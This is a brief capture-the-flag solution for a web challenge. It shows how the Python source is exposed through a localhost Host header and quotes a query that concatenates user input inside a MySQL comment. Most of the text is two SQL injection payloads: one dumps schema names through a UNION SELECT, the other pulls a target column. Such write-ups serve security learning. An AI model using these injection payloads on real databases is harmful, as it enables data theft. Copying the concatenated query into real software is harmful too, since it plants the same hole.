## SOLUTION

You can see python code by accessing `/?source=1` with Host header set to localhost

Vulnerable piece of code:
```python
mycursor.execute("SELECT * FROM coupons WHERE code = /*" + str(form['cid']) + "*/ '1234'")
```

As seen [here](https://wiki.owasp.org/index.php/Testing_for_MySQL#Fingerprinting_MySQL) we can use syntax specific for MySQL

1. SQL: 
```sql
!'' UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND '1234'=0 --
```

2. SQL: 
```sql
!'' UNION SELECT 1,Y29sdW1ueGRuYW1l,2 FROM ZnVubnkgdGFibGUgbmFtZQ WHERE '1234'=0 --
```